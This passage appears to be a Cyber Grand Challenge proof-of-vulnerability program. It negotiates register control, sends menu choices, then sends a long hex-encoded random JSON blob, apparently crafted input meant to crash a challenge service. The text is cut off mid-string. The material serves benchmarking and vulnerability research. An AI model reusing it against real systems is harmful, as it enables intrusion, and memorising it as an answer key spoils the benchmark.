#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** length read
      read_00000_len = 110;
      read_00000 = (unsigned char*)cgc_malloc(read_00000_len);
      int read_00000_res = cgc_length_read(0, read_00000, read_00000_len);
      if (read_00000_res) {} //silence unused variable warning
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x37\x37\x37\x0a";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** length read
      read_00001_len = 7;
      read_00001 = (unsigned char*)cgc_malloc(read_00001_len);
      int read_00001_res = cgc_length_read(0, read_00001, read_00001_len);
      if (read_00001_res) {} //silence unused variable warning
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x31\x31\x30\x0a";
      static unsigned int write_00001_00000_len = 4;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** length read
      read_00002_len = 25;
      read_00002 = (unsigned char*)cgc_malloc(read_00002_len);
      int read_00002_res = cgc_length_read(0, read_00002, read_00002_len);
      if (read_00002_res) {} //silence unused variable warning
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00002_00000[] = 
         "\x31\x0a\x74\x72\x75\x65\x00\x37\x37\x37\x0a";
      static unsigned int write_00002_00000_len = 11;
      unsigned char *write_00002 = NULL;
      unsigned int write_00002_len = 0;
      write_00002 = cgc_append_buf(write_00002, &write_00002_len, write_00002_00000, write_00002_00000_len);
      if (write_00002_len > 0) {
         cgc_transmit_all(1, write_00002, write_00002_len);
      }
      cgc_free(write_00002);
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** length read
      read_00003_len = 4;
      read_00003 = (unsigned char*)cgc_malloc(read_00003_len);
      int read_00003_res = cgc_length_read(0, read_00003, read_00003_len);
      if (read_00003_res) {} //silence unused variable warning
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00003_00000[] = 
         "\x32\x0a";
      static unsigned int write_00003_00000_len = 2;
      unsigned char *write_00003 = NULL;
      unsigned int write_00003_len = 0;
      write_00003 = cgc_append_buf(write_00003, &write_00003_len, write_00003_00000, write_00003_00000_len);
      if (write_00003_len > 0) {
         cgc_transmit_all(1, write_00003, write_00003_len);
      }
      cgc_free(write_00003);
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** length read
      read_00004_len = 4;
      read_00004 = (unsigned char*)cgc_malloc(read_00004_len);
      int read_00004_res = cgc_length_read(0, read_00004, read_00004_len);
      if (read_00004_res) {} //silence unused variable warning
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00004_00000[] = 
         "\x37\x37\x37\x0a";
      static unsigned int write_00004_00000_len = 4;
      unsigned char *write_00004 = NULL;
      unsigned int write_00004_len = 0;
      write_00004 = cgc_append_buf(write_00004, &write_00004_len, write_00004_00000, write_00004_00000_len);
      if (write_00004_len > 0) {
         cgc_transmit_all(1, write_00004, write_00004_len);
      }
      cgc_free(write_00004);
   } while (0);
   do {
      unsigned char *read_00005;
      unsigned int read_00005_len;
      unsigned int read_00005_ptr = 0;
      //**** length read
      read_00005_len = 4;
      read_00005 = (unsigned char*)cgc_malloc(read_00005_len);
      int read_00005_res = cgc_length_read(0, read_00005, read_00005_len);
      if (read_00005_res) {} //silence unused variable warning
      cgc_free(read_00005);
      if (read_00005_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00005_00000[] = 
         "\x32\x0a";
      static unsigned int write_00005_00000_len = 2;
      unsigned char *write_00005 = NULL;
      unsigned int write_00005_len = 0;
      write_00005 = cgc_append_buf(write_00005, &write_00005_len, write_00005_00000, write_00005_00000_len);
      if (write_00005_len > 0) {
         cgc_transmit_all(1, write_00005, write_00005_len);
      }
      cgc_free(write_00005);
   } while (0);
   do {
      unsigned char *read_00006;
      unsigned int read_00006_len;
      unsigned int read_00006_ptr = 0;
      //**** length read
      read_00006_len = 4;
      read_00006 = (unsigned char*)cgc_malloc(read_00006_len);
      int read_00006_res = cgc_length_read(0, read_00006, read_00006_len);
      if (read_00006_res) {} //silence unused variable warning
      cgc_free(read_00006);
      if (read_00006_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00006_00000[] = 
         "\x39\x38\x33\x0a";
      static unsigned int write_00006_00000_len = 4;
      unsigned char *write_00006 = NULL;
      unsigned int write_00006_len = 0;
      write_00006 = cgc_append_buf(write_00006, &write_00006_len, write_00006_00000, write_00006_00000_len);
      if (write_00006_len > 0) {
         cgc_transmit_all(1, write_00006, write_00006_len);
      }
      cgc_free(write_00006);
   } while (0);
   do {
      unsigned char *read_00007;
      unsigned int read_00007_len;
      unsigned int read_00007_ptr = 0;
      //**** length read
      read_00007_len = 25;
      read_00007 = (unsigned char*)cgc_malloc(read_00007_len);
      int read_00007_res = cgc_length_read(0, read_00007, read_00007_len);
      if (read_00007_res) {} //silence unused variable warning
      cgc_free(read_00007);
      if (read_00007_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00007_00000[] = 
         "\x32\x0a";
      static unsigned int write_00007_00000_len = 2;
      unsigned char *write_00007 = NULL;
      unsigned int write_00007_len = 0;
      write_00007 = cgc_append_buf(write_00007, &write_00007_len, write_00007_00000, write_00007_00000_len);
      if (write_00007_len > 0) {
         cgc_transmit_all(1, write_00007, write_00007_len);
      }
      cgc_free(write_00007);
   } while (0);
   do {
      unsigned char *read_00008;
      unsigned int read_00008_len;
      unsigned int read_00008_ptr = 0;
      //**** length read
      read_00008_len = 4;
      read_00008 = (unsigned char*)cgc_malloc(read_00008_len);
      int read_00008_res = cgc_length_read(0, read_00008, read_00008_len);
      if (read_00008_res) {} //silence unused variable warning
      cgc_free(read_00008);
      if (read_00008_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00008_00000[] = 
         "\x31\x0a\x7b\x22\x61\x6f\x46\x4f\x43\x68\x65\x6f\x56\x5a\x62\x48"
         "\x4e\x62\x46\x67\x44\x4d\x67\x53\x59\x46\x74\x72\x50\x42\x48\x61"
         "\x71\x68\x22\x3a\x20\x22\x44\x6d\x2c\x20\x22\x64\x45\x66\x70\x73"
         "\x42\x54\x66\x49\x75\x6d\x6c\x78\x4b\x68\x66\x52\x41\x56\x6b\x61"
         "\x61\x57\x61\x66\x6b\x4f\x69\x65\x6a\x72\x47\x6b\x4c\x78\x6a\x68"
         "\x50\x7a\x57\x50\x59\x63\x47\x72\x6b\x75\x5a\x4c\x55\x66\x58\x4e"
         "\x47\x4c\x73\x70\x22\x3a\x20\x2d\x30\x2e\x35\x35\x2c\x20\x22\x68"
         "\x41\x52\x22\x3a\x20\x74\x72\x75\x65\x2c\x20\x22\x6d\x4c\x74\x76"
         "\x65\x5a\x46\x49\x4d\x74\x58\x74\x6a\x75\x74\x62\x52\x46\x7a\x79"
         "\x4c\x4d\x7a\x59\x54\x79\x59\x64\x45\x22\x3a\x20\x6e\x75\x6c\x6c"
         "\x2c\x20\x22\x49\x4a\x70\x4c\x4e\x4c\x76\x4b\x72\x72\x69\x43\x59"
         "\x6a\x52\x61\x45\x53\x4b\x43\x6d\x77\x44\x66\x56\x7a\x48\x6c\x74"
         "\x43\x43\x6b\x6a\x42\x48\x57\x66\x62\x56\x75\x42\x43\x59\x46\x51"
         "\x4f\x74\x65\x71\x71\x44\x22\x3a\x20\x22\x72\x22\x2c\x20\x22\x76"
         "\x22\x3a\x20\x2d\x30\x2e\x30\x39\x2c\x20\x22\x58\x66\x4a\x73\x43"
         "\x44\x49\x44\x4b\x47\x7a\x79\x70\x58\x57\x53\x68\x7a\x73\x61\x74"
         "\x56\x53\x56\x46\x72\x78\x51\x58\x56\x72\x6c\x6e\x54\x44\x71\x65"
         "\x4c\x76\x62\x67\x75\x49\x57\x75\x67\x50\x70\x77\x70\x79\x43\x69"
         "\x42\x51\x41\x4c\x68\x6d\x22\x3a\x20\x6e\x75\x6c\x6c\x2c\x20\x22"
         "\x62\x4d\x22\x3a\x20\x6e\x75\x6c\x6c\x2c\x20\x22\x6d\x42\x62\x45"
         "\x6e\x6b\x5a\x54\x63\x5a\x6a\x65\x71\x58\x6e\x75\x4f\x71\x6f\x59"
         "\x4c\x22\x3a\x20\x2d\x31\x34\x37\x33\x39\x38\x36\x31\x39\x37\x2c"
         "\x20\x22\x6c\x58\x65\x79\x74\x22\x3a\x20\x5b\x2d\x31\x37\x39\x36"
         "\x37\x30\x35\x38\x31\x37\x2c\x20\x7b\x22\x58\x59\x45\x78\x50\x6b"
         "\x57\x47\x69\x54\x51\x5a\x7a\x58\x6c\x5a\x56\x4d\x6e\x6b\x4f\x78"
         "\x62\x4a\x49\x64\x54\x4a\x62\x66\x73\x45\x74\x54\x64\x45\x6f\x6f"
         "\x63\x4c\x58\x22\x3a\x20\x7b\x22\x45\x41\x61\x53\x49\x44\x62\x53"
         "\x59\x43\x4b\x57\x4a\x68\x46\x59\x79\x5a\x7a\x4d\x5a\x76\x6c\x72"
         "\x69\x54\x52\x52\x70\x6b\x77\x75\x76\x69\x51\x49\x6d\x72\x4a\x6f"
         "\x70\x47\x74\x57\x6a\x4a\x58\x67\x62\x7a\x64\x68\x63\x77\x73\x5a"
         "\x65\x54\x45\x43\x58\x77\x4f\x6f\x77\x6c\x6b\x22\x3a\x20\x31\x35"
         "\x38\x38\x36\x39\x30\x35\x35\x36\x2c\x20\x22\x55\x52\x6f\x6b\x66"
         "\x71\x43\x62\x76\x74\x47\x4d\x63\x71\x62\x61\x4f\x48\x43\x44\x47"
         "\x7a\x6e\x68\x79\x72\x70\x54\x71\x22\x3a\x20\x22\x51\x46\x70\x6d"
         "\x75\x77\x4b\x4a\x46\x46\x77\x59\x48\x62\x57\x4d\x58\x72\x77\x6e"
         "\x64\x4a\x6e\x54\x50\x4a\x61\x6c\x64\x4a\x48\x48\x6b\x4a\x56\x6f"
         "\x71\x6a\x59\x4e\x74\x75\x74\x52\x66\x6f\x69\x73\x4b\x57\x66\x71"
         "\x5a\x4f\x66\x6f\x49\x57\x69\x4c\x6e\x45\x67\x76\x77\x75\x7a\x50"
         "\x63\x52\x63\x73\x50\x6c\x78\x44\x6b\x7a\x6a\x58\x76\x47\x45\x4a"
         "\x7a\x22\x2c\x20\x22\x44\x41\x77\x42\x77\x66\x55\x77\x51\x54\x46"
         "\x67\x69\x4f\x68\x50\x5a\x75\x6d\x56\x63\x6c\x46\x59\x4a\x22\x3a"
         "\x20\x22\x52\x7a\x75\x51\x65\x4e\x6c\x50\x6e\x75\x6c\x51\x52\x6b"
         "\x78\x71\x6e\x6f\x6e\x22\x2c\x20\x22\x74\x78\x79\x42\x57\x6b\x75"
         "\x77\x43\x75\x64\x62\x68\x53\x51\x57\x56\x4f\x59\x4e\x48\x47\x54"
         "\x50\x73\x62\x6b\x44\x54\x6e\x7a\x6e\x59\x4c\x75\x6f\x55\x49\x58"
         "\x79\x66\x55\x59\x4d\x44\x50\x71\x5a\x61\x53\x45\x54\x48\x76\x72"
         "\x74\x50\x66\x51\x48\x54\x57\x22\x3a\x20\x31\x2e\x32\x39\x2c\x20"
         "\x22\x53\x22\x3a\x20\x2d\x30\x2e\x31\x36\x7d\x2c\x20\x22\x4b\x65"
         "\x69\x6c\x6a\x54\x48\x6a\x43\x72\x74\x6b\x75\x4b\x79\x46\x77\x48"
         "\x22\x3a\x20\x7b\x22\x4d\x55\x47\x4d\x53\x58\x6c\x4f\x57\x5a\x73"
         "\x6d\x6d\x51\x62\x22\x3a\x20\x22\x4d\x4b\x61\x74\x22\x2c\x20\x22"
         "\x69\x46\x69\x53\x75\x76\x54\x55\x5a\x57\x79\x7a\x49\x74\x70\x68"
         "\x73\x65\x52\x4b\x4b\x47\x4b\x47\x50\x77\x6b\x53\x76\x52\x77\x6f"
         "\x50\x6a\x53\x59\x68\x70\x50\x6e\x4d\x6c\x65\x4a\x66\x46\x67\x42"
         "\x6e\x41\x44\x73\x6d\x42\x54\x58\x6b\x22\x3a\x20\x22\x64\x61\x4a"
         "\x6b\x65\x64\x6f\x76\x49\x54\x53\x53\x6c\x4e\x4b\x57\x72\x53\x47"
         "\x45\x4c\x43\x6f\x72\x72\x69\x6e\x58\x4a\x72\x6d\x6a\x69\x69\x59"
         "\x49\x69\x51\x66\x65\x51\x66\x48\x56\x58\x59\x22\x2c\x20\x22\x58"
         "\x69\x49\x75\x6a\x66\x62\x45\x4d\x4c\x49\x46\x76\x57\x49\x53\x73"
         "\x6f\x64\x42\x41\x41\x55\x70\x4a\x63\x43\x65\x42\x77\x47\x4a\x53"
         "\x56\x58\x6e\x71\x22\x3a\x20\x2d\x32\x30\x30\x30\x31\x30\x34\x34"
         "\x30\x36\x2c\x20\x22\x61\x4e\x68\x71\x58\x48\x54\x55\x6c\x70\x7a"
         "\x56\x56\x57\x79\x78\x43\x56\x54\x79\x56\x6d\x58\x62\x5a\x62\x65"
         "\x52\x6d\x74\x72\x65\x68\x52\x4d\x77\x6d\x58\x44\x71\x6f\x61\x70"
         "\x67\x50\x46\x41\x6f\x6a\x6e\x52\x49\x4b\x44\x59\x6a\x48\x63\x52"
         "\x64\x4b\x4d\x66\x72\x55\x58\x46\x79\x69\x54\x4d\x68\x4c\x4e\x70"
         "\x42\x77\x4d\x66\x4d\x58\x66\x58\x4b\x58\x42\x22\x3a\x20\x2d\x30"
         "\x2e\x31\x32\x2c\x20\x22\x71\x6b\x22\x3a\x20\x6e\x75\x6c\x6c\x2c"
         "\x20\x22\x6c\x43\x47\x44\x45\x66\x79\x46\x6b\x42\x64\x22\x3a\x20"
         "\x2d\x35\x38\x38\x32\x38\x35\x39\x35\x32\x2c\x20\x22\x73\x71\x7a"
         "\x67\x53\x4b\x76\x50\x67\x7a\x6c\x6e\x6b\x51\x64\x56\x4f\x45\x53"
         "\x50\x68\x56\x4f\x64\x52\x66\x45\x56\x4d\x73\x54\x69\x6d\x4e\x64"
         "\x6a\x57\x41\x44\x51\x51\x64\x50\x4c\x6b\x6f\x5a\x4e\x6f\x43\x6c"
         "\x59\x76\x46\x22\x3a\x20\x30\x2e\x32\x34\x2c\x20\x22\x61\x66\x7a"
         "\x41\x6f\x4f\x6b\x6c\x71\x54\x6b\x68\x56\x72\x4b\x46\x45\x50\x47"
         "\x6c\x42\x76\x56\x6e\x4b\x59\x6e\x65\x64\x54\x61\x22\x3a\x20\x22"
         "\x4c\x71\x58\x79\x55\x71\x41\x62\x4b\x62\x43\x51\x45\x74\x59\x49"
         "\x68\x66\x63\x58\x72\x6e\x22\x2c\x20\x22\x46\x43\x69\x63\x68\x50"
         "\x50\x50\x53\x63\x58\x50\x43\x4b\x6f\x53\x77\x6a\x6c\x4f\x73\x58"
         "\x45\x55\x71\x56\x53\x65\x59\x58\x62\x77\x47\x61\x65\x48\x54\x59"
         "\x64\x61\x51\x4e\x61\x56\x71\x6d\x63\x54\x65\x55\x74\x61\x4b\x50"
         "\x49\x22\x3a\x20\x33\x35\x34\x32\x37\x32\x32\x36\x37\x2c\x20\x22"
         "\x62\x56\x59\x6d\x6e\x44\x71\x4f\x61\x42\x63\x72\x54\x6a\x6e\x6c"
         "\x4a\x54\x61\x6e\x61\x47\x6c\x43\x4a\x43\x57\x41\x74\x4d\x5a\x62"
         "\x72\x78\x49\x70\x7a\x6c\x6a\x5a\x52\x49\x6e\x65\x64\x63\x22\x3a"
         "\x20\x22\x4d\x4a\x46\x68\x67\x22\x7d\x2c\x20\x22\x4c\x4a\x6b\x53"
         "\x77\x42\x73\x42\x61\x64\x77\x47\x62\x62\x73\x79\x75\x6a\x7a\x4e"
         "\x63\x52\x62\x4f\x4d\x53\x53\x79\x51\x48\x6a\x68\x45\x77\x44\x42"
         "\x66\x22\x3a\x20\x66\x61\x6c\x73\x65\x2c\x20\x22\x42\x44\x6f\x78"
         "\x63\x5a\x54\x6b\x49\x46\x61\x42\x43\x4c\x70\x78\x6d\x78\x5a\x5a"
         "\x65\x69\x68\x64\x67\x4c\x59\x6d\x6b\x64\x6d\x4b\x67\x79\x46\x49"
         "\x6b\x74\x7a\x4f\x4c\x49\x71\x56\x69\x4f\x75\x47\x4c\x44\x73\x75"
         "\x68\x69\x6d\x67\x42\x4d\x7a\x4a\x5a\x6e\x52\x64\x5a\x74\x22\x3a"
         "\x20\x6e\x75\x6c\x6c\x2c\x20\x22\x78\x44\x67\x49\x6f\x76\x75\x57"
         "\x42\x6c\x49\x6b\x71\x6d\x52\x66\x76\x7a\x4f\x68\x51\x63\x79\x4b"
         "\x22\x3a\x20\x6e\x75\x6c\x6c\x2c\x20\x22\x6c\x4d\x6c\x45\x72\x4d"
         "\x7a\x4d\x61\x67\x6a\x63\x75\x6f\x4e\x5a\x4e\x49\x46\x44\x7a\x65"
         "\x63\x6a\x45\x63\x53\x43\x54\x62\x48\x54\x4c\x44\x47\x78\x74\x4e"
         "\x59\x56\x66\x46\x75\x44\x63\x52\x6d\x75\x6c\x69\x44\x6c\x22\x3a"
         "\x20\x7b\x22\x75\x64\x45\x4c\x74\x64\x58\x79\x7a\x48\x6c\x76\x76"
         "\x63\x42\x72\x53\x59\x66\x48\x77\x57\x46\x51\x6f\x22\x3a\x20\x2d"
         "\x31\x2e\x39\x36\x2c\x20\x22\x6a\x6d\x61\x4d\x46\x57\x6c\x4d\x52"
         "\x71\x4a\x66\x7a\x6b\x66\x67\x5a\x58\x41\x59\x4c\x4b\x65\x61\x6a"
         "\x6c\x78\x50\x4f\x57\x77\x71\x41\x5a\x45\x62\x61\x43\x53\x51\x22"
         "\x3a\x20\x2d\x30\x2e\x36\x37\x2c\x20\x22\x57\x22\x3a\x20\x22\x63"
         "\x77\x6d\x67\x68\x42\x72\x56\x56\x58\x22\x2c\x20\x22\x48\x4e\x42"
         "\x57\x45\x52\x79\x66\x67\x73\x70\x70\x62\x70\x67\x79\x6f\x4c\x4b"
         "\x74\x4b\x62\x4e\x64\x50\x63\x77\x77\x48\x56\x56\x67\x59\x58\x6b"
         "\x59\x6c\x6d\x6c\x78\x59\x61\x6b\x6a\x52\x73\x76\x47\x68\x49\x51"
         "\x48\x50\x70\x76\x4c\x65\x48\x6b\x6e\x7a\x73\x55\x56\x4d\x4c\x56"
         "\x62\x78\x55\x72\x46\x43\x68\x22\x3a\x20\x2d\x30\x2e\x39\x35\x2c"
         "\x20\x22\x5a\x57\x47\x45\x48\x63\x6d\x6d\x6c\x69\x73\x57\x50\x4e"
         "\x6a\x62\x59\x79\x6d\x65\x72\x76\x49\x44\x64\x4a\x77\x73\x65\x7a"
         "\x6b\x58\x7a\x62\x52\x49\x48\x6c\x67\x6f\x62\x41\x71\x4e\x6e\x72"
         "\x5a\x55\x63\x69\x6b\x6a\x6d\x72\x45\x6d\x4e\x47\x72\x6e\x48\x68"
         "\x71\x77\x65\x6d\x4e\x48\x74\x57\x44\x77\x4a\x6e\x4e\x22\x3a\x20"
         "\x2d\x35\x31\x36\x33\x32\x39\x38\x39\x38\x2c\x20\x22\x6f\x47\x77"
         "\x55\x50\x64\x6a\x63\x4b\x77\x7a\x4c\x4c\x6c\x5a\x46\x51\x79\x4a"
         "\x49\x45\x47\x4f\x73\x51\x58\x4c\x50\x6f\x4e\x49\x4d\x69\x61\x77"
         "\x78\x7a\x4a\x59\x41\x77\x68\x43\x6c\x74\x50\x6b\x4d\x63\x6a\x61"
         "\x63\x6e\x22\x3a\x20\x2d\x31\x35\x30\x35\x32\x33\x36\x34\x30\x31"
         "\x2c\x20\x22\x50\x6b\x69\x58\x79\x54\x65\x66\x49\x63\x55\x41\x57"
         "\x56\x6c\x57\x79\x22\x3a\x20\x6e\x75\x6c\x6c\x2c\x20\x22\x6e\x41"
         "\x44\x6b\x77\x74\x59\x4d\x54\x52\x58\x68\x6f\x4b\x55\x61\x46\x68"
         "\x4d\x53\x73\x68\x41\x4e\x6e\x69\x53\x7a\x69\x64\x7a\x41\x7a\x59"
         "\x4c\x44\x6c\x44\x73\x6c\x48\x4e\x42\x66\x65\x4c\x76\x78\x66\x68"
         "\x74\x7a\x75\x6d\x4b\x71\x77\x49\x55\x59\x51\x70\x48\x76\x4e\x79"
         "\x62\x7a\x70\x69\x22\x3a\x20\x22\x78\x61\x78\x62\x22\x2c\x20\x22"
         "\x70\x77\x62\x71\x6b\x75\x48\x49\x6a\x51\x6b\x70\x6a\x4e\x64\x78"
         "\x47\x4a\x64\x6f\x6a\x67\x43\x67\x5a\x6c\x45\x4a\x43\x4b\x67\x6d"
         "\x4d\x79\x71\x55\x58\x4d\x6b\x76\x4d\x7a\x70\x47\x53\x72\x56\x57"
         "\x68\x79\x52\x6b\x6f\x43\x6c\x56\x41\x4d\x46\x7a\x66\x71\x4b\x55"
         "\x70\x6b\x63\x6d\x42\x7a\x4c\x51\x47\x74\x7a\x66\x69\x52\x66\x48"
         "\x59\x4a\x75\x76\x4f\x57\x45\x22\x3a\x20\x2d\x31\x36\x30\x34\x31"
         "\x37\x33\x33\x34\x32\x2c\x20\x22\x6c\x22\x3a\x20\x22\x57\x45\x4a"
         "\x57\x6b\x71\x65\x66\x59\x56\x47\x74\x58\x58\x59\x4b\x4f\x6a\x69"
         "\x70\x4e\x43\x64\x57\x73\x4b\x53\x63\x67\x67\x6d\x55\x58\x41\x46"
         "\x45\x47\x73\x74\x7a\x78\x5a\x6a\x6e\x6f\x51\x78\x6c\x4c\x75\x54"
         "\x41\x49\x62\x66\x69\x66\x69\x4d\x74\x78\x48\x41\x54\x44\x75\x49"
         "\x70\x48\x77\x53\x47\x44\x55\x6a\x6e\x55\x79\x4c\x59\x63\x53\x22"
         "\x2c\x20\x22\x6e\x79\x61\x6e\x5f\x73\x61\x79\x73\x22\x3a\x20\x22"
         "\x57\x51\x7a\x50\x67\x4f\x59\x6a\x48\x42\x71\x62\x59\x53\x6e\x4a"
         "\x42\x4a\x5a\x59\x6c\x4e\x72\x50\x69\x56\x42\x73\x41\x68\x4e\x4e"
         "\x56\x6c\x5a\x78\x6d\x6a\x4e\x63\x50\x46\x63\x4c\x79\x4f\x65\x63"
         "\x4b\x70\x74\x58\x58\x61\x4f\x49\x51\x74\x79\x62\x22\x7d\x2c\x20"
         "\x22\x53\x77\x6f\x7a\x51\x4a\x48\x49\x49\x22\x3a\x20\x66\x61\x6c"
         "\x73\x65\x2c\x20\x22\x57\x65\x57\x79\x65\x78\x41\x70\x56\x64\x4d"
         "\x78\x78\x49\x74\x50\x76\x71\x51\x66\x22\x3a\x20\x6e\x75\x6c\x6c"
         "\x2c\x20\x22\x53\x56\x71\x63\x56\x6b\x67\x68\x53\x47\x67\x76\x46"
         "\x52\x59\x51\x52\x57\x6d\x6a\x66\x79\x42\x70\x64\x54\x52\x6d\x6d"
         "\x42\x4b\x62\x75\x4a\x67\x55\x22\x3a\x20\x22\x70\x54\x79\x65\x63"
         "\x49\x41\x70\x42\x53\x51\x53\x54\x79\x42\x49\x54\x4d\x22\x2c\x20"
         "\x22\x4a\x47\x66\x53\x62\x6d\x51\x56\x6d\x63\x54\x59\x54\x4b\x66"
         "\x41\x6a\x6c\x6b\x5a\x69\x56\x6a\x57\x62\x67\x52\x45\x4e\x4f\x45"
         "\x68\x43\x6f\x4e\x69\x5a\x43\x41\x72\x4f\x69\x72\x48\x78\x50\x53"
         "\x70\x7a\x4c\x6f\x6a\x50\x71\x62\x66\x7a\x53\x52\x63\x42\x56\x57"
         "\x44\x55\x43\x43\x58\x57\x22\x3a\x20\x22\x71\x6e\x6d\x66\x64\x72"
         "\x71\x48\x43\x70\x78\x55\x22\x2c\x20\x22\x58\x69\x58\x4c\x44\x46"
         "\x56\x5a\x48\x51\x50\x54\x54\x6a\x41\x75\x4c\x49\x4c\x41\x79\x44"
         "\x52\x41\x76\x55\x47\x53\x41\x4e\x77\x6e\x6d\x58\x6f\x5a\x46\x6e"
         "\x71\x4b\x68\x6e\x54\x67\x7a\x42\x22\x3a\x20\x6e\x75\x6c\x6c\x2c"
         "\x20\x22\x4a\x7a\x41\x69\x57\x77\x58\x78\x44\x47\x66\x62\x44\x77"
         "\x44\x58\x72\x58\x4f\x77\x74\x7a\x7a\x6b\x66\x45\x52\x74\x54\x59"
         "\x67\x52\x41\x71\x5a\x57\x77\x74\x49\x6e\x67\x58\x59\x4b\x52\x63"
         "\x66\x69\x4a\x4b\x4e\x22\x3a\x20\x22\x58\x51\x75\x47\x48\x70\x6e"
         "\x47\x4e\x4a\x50\x47\x65\x74\x73\x68\x54\x6e\x73\x68\x41\x6e\x61"
         "\x46\x76\x64\x64\x49\x42\x74\x51\x6c\x4d\x4d\x6e\x55\x46\x4d\x59"
         "\x48\x58\x49\x49\x71\x5a\x58\x6c\x7a\x49\x57\x4e\x6b\x6d\x51\x51"
         "\x6d\x6d\x6a\x44\x71\x53\x4e\x4a\x75\x58\x57\x6a\x52\x4d\x50\x4f"
         "\x6b\x4e\x62\x70\x6a\x79\x5a\x50\x4c\x63\x53\x6c\x22\x7d\x2c\x20"
         "\x5b\x6e\x75\x6c\x6c\x5d\x2c\x20\x6e\x75\x6c\x6c\x2c\x20\x2d\x31"
         "\x31\x37\x35\x33\x34\x30\x39\x38\x31\x2c\x20\x22\x7a\x4d\x43\x46"
         "\x4f\x4d\x52\x53\x54\x74\x42\x58\x67\x69\x45\x56\x68\x71\x6e\x72"
         "\x47\x6c\x73\x50\x45\x46\x65\x57\x42\x45\x76\x71\x4f\x46\x50\x6b"
         "\x6a\x49\x59\x62\x72\x4d\x49\x69\x42\x22\x2c\x20\x30\x2e\x33\x32"
         "\x2c\x20\x22\x75\x74\x59\x50\x55\x6d\x63\x73\x73\x59\x47\x41\x4b"
         "\x5a\x48\x4a\x70\x47\x57\x47\x6a\x71\x65\x47\x22\x2c\x20\x2d\x38"
         "\x34\x30\x36\x35\x37\x37\x39\x36\x2c\x20\x2d\x31\x2e\x30\x31\x5d"
         "\x2c\x20\x22\x67\x53\x43\x4b\x59\x61\x75\x43\x4e\x67\x6b\x6a\x74"
         "\x61\x73\x4f\x51\x7a\x6f\x6b\x54\x44\x56\x5a\x6f\x6f\x4e\x63\x55"
         "\x47\x73\x6e\x77\x70\x4c\x22\x3a\x20\x66\x61\x6c\x73\x65\x2c\x20"
         "\x22\x61\x79\x4c\x6d\x78\x52\x72\x4a\x6e\x59\x7a\x41\x6a\x77\x55"
         "\x55\x74\x4c\x43\x56\x4f\x43\x63\x51\x73\x6f\x70\x50\x46\x53\x76"
         "\x7a\x4c\x65\x72\x59\x4d\x56\x69\x4a\x6d\x73\x6a\x6e\x6e\x68\x4d"
         "\x4c\x45\x48\x65\x72\x56\x43\x4d\x6e\x61\x51\x43\x6f\x22\x3a\x20"
         "\x2d\x30\x2e\x35\x37\x2c\x20\x22\x63\x79\x4b\x42\x6e\x65\x59\x64"
         "\x66\x49\x47\x4b\x53\x56\x6c\x41\x4a\x76\x75\x52\x51\x42\x55\x49"
         "\x22\x3a\x20\x74\x72\x75\x65\x2c\x20\x22\x68\x4d\x63\x22\x3a\x20"
         "\x31\x2e\x39\x36\x2c\x20\x22\x48\x22\x3a\x20\x2d\x38\x30\x38\x34"
         "\x37\x30\x30\x34\x38\x2c\x20\x22\x54\x73\x50\x69\x59\x51\x64\x41"
         "\x64\x51\x4f\x79\x63\x75\x7a\x69\x4e\x58\x4d\x50\x62\x4b\x53\x71"
         "\x43\x71\x41\x7a\x76\x50\x6c\x6f\x63\x4c\x61\x4b\x7a\x58\x72\x4b"
         "\x4c\x4e\x69\x50\x44\x4a\x4a\x45\x4c\x47\x64\x6c\x6b\x77\x4c\x22"
         "\x3a\x20\x34\x31\x33\x37\x34\x35\x37\x34\x2c\x20\x22\x4b\x71\x53"
         "\x51\x6a\x79\x79\x73\x49\x75\x41\x45\x78\x56\x65\x45\x47\x6b\x67"
         "\x58\x69\x4b\x74\x52\x75\x62\x72\x4c\x73\x6a\x4f\x4b\x4c\x68\x4d"
         "\x53\x4f\x56\x7a\x43\x63\x50\x41\x49\x4f\x79\x22\x3a\x20\x33\x2e"
         "\x31\x38\x2c\x20\x22\x64\x72\x56\x56\x43\x48\x4f\x69\x6b\x47\x72"
         "\x48\x65\x6b\x6e\x22\x3a\x20\x35\x33\x35\x38\x38\x33\x30\x31\x39"
         "\x2c\x20\x22\x4b\x74\x46\x75\x6d\x51\x54\x78\x71\x48\x47\x65\x50"
